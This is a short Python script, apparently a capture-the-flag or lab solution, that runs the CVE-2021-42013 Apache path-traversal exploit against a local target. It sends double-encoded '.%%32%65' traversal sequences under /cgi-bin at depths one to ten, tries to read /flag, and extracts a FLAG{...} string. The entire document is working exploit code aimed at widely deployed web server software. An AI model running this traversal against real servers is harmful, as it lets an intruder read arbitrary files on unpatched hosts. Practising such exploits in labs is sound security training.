import requests
import re

target = "http://127.0.0.1:33094"
base_path = "/cgi-bin"

print("Testing CVE-2021-42013 Path Traversal")
print("=" * 60)

found_flag = False

for depth in range(1, 11):
    # Build traversal path with depth-encoded sequences
    traversal = "/.%%32%65" * depth
    url = f"{target}{base_path}{traversal}/flag"
    
    print(f"\n[DEPTH {depth}] Testing: {url}")
    
    try:
        response = requests.get(url, timeout=10)
        
        # Record key information
        status = response.status_code
        size = len(response.content)
        server_header = response.headers.get("Server", "N/A")
        
        print(f"  Status: {status}")
        print(f"  Response Size: {size} bytes")
        print(f"  Server: {server_header}")
        
        # Check for key headers that might indicate Apache
        if "apache" in server_header.lower():
            print(f"  [+] Apache server detected")
            
        # Analyze response
        if status == 200:
            print(f"  [SUCCESS] Found /flag at depth {depth}")
            # Look for FLAG pattern
            flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
            if flag_match:
                print(f"  [!] FLAG DISCOVERED: {flag_match.group(0)}")
                found_flag = True
            else:
                print(f"  Response preview: {response.text[:300]}")
        elif status == 403:
            print(f"  [i] Traversal working but permissions denied")
        elif status == 404:
            print(f"  [i] File not found at this depth")
        elif status == 500:
            print(f"  [i] Server error - CGI execution attempted?")
        else:
            print(f"  [i] Unexpected status code - investigate")
            
        # For anomalies or successes, show more details
        if status != 404 or (depth <= 3 and status == 404):
            print(f"  Full Response (first 500 chars): {response.text[:500]}")
            
    except requests.exceptions.Timeout:
        print(f"  [ERROR] Request timed out")
    except Exception as e:
        print(f"  [ERROR] Exception occurred: {e}")

print("\n" + "=" * 60)
if found_flag:
    print("[COMPLETE] Flag successfully found!")
else:
    print("[COMPLETE] Testing finished. No flag found with depths 1-10.")

print("\nSummary:")
print("- Depths 1-10 tested")
print("- Looking for FILE pattern")
print("- Status codes indicate if traversal is working")
